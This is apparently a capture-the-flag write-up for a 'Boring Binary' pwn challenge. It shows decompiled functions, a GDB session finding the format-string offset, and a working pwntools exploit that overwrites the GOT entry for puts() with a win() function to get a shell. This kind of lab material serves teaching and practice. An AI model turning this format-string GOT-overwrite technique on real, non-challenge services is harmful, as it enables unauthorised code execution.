# [EASY] PWN - Boring Binary

## Overview
This binary contains a blind format-string vulnerability and was compiled with **Partial RELRO** which allows the user to overwrite **GOT** entries, leading to the redirection of execution.

## Initial Analysis
Disassemble the binary and note the 3 interesting functions: `main()`, `greet()`, and `win()`.

### main()
```
undefined8 main(void)
{
    setup();
    puts("This is literally the most boring binary you will see this CTF...\n");
    greet();
    puts("Told you it was boring.");
    return 0;
}
```

### greet()
```
void greet(void)
{
    int64_t in_FS_OFFSET;
    char *format;
    char *var_78h;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    printf("Tell me your name: ");
    fgets(&format, 0x40, _stdin);
    snprintf(&var_78h, 0x60, &format);
    puts("\nThanks. You can leave now.\n");
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
    }
    return;
}
```

### win()
```
void win(void)
{
    system("/bin/sh");
    return;
}
```

## Exploitation
Run the binary in a debugger, such as `GDB`, and when prompted to enter a name, provide a payload like: `AAAA.%p.%p.%p.%p.%p.%p`.
This allows you to view the position at which input is stored on the stack.

```
gef➤  disas greet
Dump of assembler code for function greet:
   0x0000000000401272 <+0>:	endbr64
   0x0000000000401276 <+4>:	push   rbp
   0x0000000000401277 <+5>:	mov    rbp,rsp
   0x000000000040127a <+8>:	sub    rsp,0xb0
   0x0000000000401281 <+15>:	mov    rax,QWORD PTR fs:0x28
   0x000000000040128a <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040128e <+28>:	xor    eax,eax
   0x0000000000401290 <+30>:	lea    rdi,[rip+0xd79]        # 0x402010
   0x0000000000401297 <+37>:	mov    eax,0x0
   0x000000000040129c <+42>:	call   0x4010d0 <printf@plt>
   0x00000000004012a1 <+47>:	mov    rdx,QWORD PTR [rip+0x2dc8]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x00000000004012a8 <+54>:	lea    rax,[rbp-0xb0]
   0x00000000004012af <+61>:	mov    esi,0x40
   0x00000000004012b4 <+66>:	mov    rdi,rax
   0x00000000004012b7 <+69>:	call   0x4010f0 <fgets@plt>
   0x00000000004012bc <+74>:	lea    rdx,[rbp-0xb0]
   0x00000000004012c3 <+81>:	lea    rax,[rbp-0x70]
   0x00000000004012c7 <+85>:	mov    esi,0x60
   0x00000000004012cc <+90>:	mov    rdi,rax
   0x00000000004012cf <+93>:	mov    eax,0x0
   0x00000000004012d4 <+98>:	call   0x4010e0 <snprintf@plt>
   0x00000000004012d9 <+103>:	lea    rdi,[rip+0xd44]        # 0x402024
   0x00000000004012e0 <+110>:	call   0x4010a0 <puts@plt>
   0x00000000004012e5 <+115>:	nop
   0x00000000004012e6 <+116>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004012ea <+120>:	xor    rax,QWORD PTR fs:0x28
   0x00000000004012f3 <+129>:	je     0x4012fa <greet+136>
   0x00000000004012f5 <+131>:	call   0x4010b0 <__stack_chk_fail@plt>
   0x00000000004012fa <+136>:	leave
   0x00000000004012fb <+137>:	ret
End of assembler dump.
gef➤  b *greet+103
Breakpoint 1 at 0x4012d9
gef➤  r
Starting program: ./chall 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
This is literally the most boring binary you will see this CTF...

Tell me your name: AAAA.%p.%p.%p.%p.%p.%p 

Breakpoint 1, 0x00000000004012d9 in greet ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x56              
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffdbb0  →  "AAAA.%p.%p.%p.%p.%p.%p\n"
$rbp   : 0x00007fffffffdc60  →  0x00007fffffffdc70  →  0x00007fffffffdd10  →  0x00007fffffffdd70  →  0x0000000000000000
$rsi   : 0x00007fffffffdbc6  →  0x7ffff7f9e5c0000a ("\n"?)
$rdi   : 0x00007fffffffda00  →  0x00007fffffffdbf0  →  "AAAA.0x7ffff7f9f7a0.(nil).(nil).0x2e70252e41414141[...]"
$rip   : 0x00000000004012d9  →  <greet+0067> lea rdi, [rip+0xd44]        # 0x402024
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x1               
$r11   : 0x0               
$r12   : 0x00007fffffffdd98  →  0x00007fffffffe102  →  "./chall"
$r13   : 0x1               
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2f0  →  0x0000000000000000
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdbb0│+0x0000: "AAAA.%p.%p.%p.%p.%p.%p\n"	 ← $rsp
0x00007fffffffdbb8│+0x0008: "%p.%p.%p.%p.%p\n"
0x00007fffffffdbc0│+0x0010: ".%p.%p\n"
0x00007fffffffdbc8│+0x0018: 0x00007ffff7f9e5c0  →  0x00000000fbad2887
0x00007fffffffdbd0│+0x0020: 0x00007fffffffdbf0  →  "AAAA.0x7ffff7f9f7a0.(nil).(nil).0x2e70252e41414141[...]"
0x00007fffffffdbd8│+0x0028: 0x00007ffff7e1d541  →  <__GI__IO_do_write+0021> cmp QWORD PTR [rbp-0x8], rax
0x00007fffffffdbe0│+0x0030: 0x00007fffffffdc20  →  "41.0x70252e70252e7025.0xa70252e70252e\n"
0x00007fffffffdbe8│+0x0038: 0x0000000000000001
```

```
$rdi   : 0x00007fffffffda00  →  0x00007fffffffdbf0  →  "AAAA.0x7ffff7f9f7a0.(nil).(nil).0x2e70252e41414141[...]"
														^	 ^				^	  ^		^^^^^^^^^^^^^^^^^^
													  input	 1				2	  3		4
```

After returning from the `greet()` function, a call to `puts()` is made (`puts("Told you it was boring.");`).
Build a format-string payload, or use a pwntools script to do it automatically, to overwrite the **GOT** entry for `puts()` with the address of `win()`.

## Exploit
```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./chall", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
payload = fmtstr_payload(4, {binary.got['puts']: binary.sym["win"]})
info(f"Format String Exploit: {payload.decode('utf-8')}")

p.sendlineafter(b"name: ", payload)
p.interactive()

# Close connection
p.close()
```

- Run it locally with: `python3 exploit.py`
- Run it on the remote instance with: `python3 exploit.py REMOTE HOST=<IP> PORT=<PORT>`
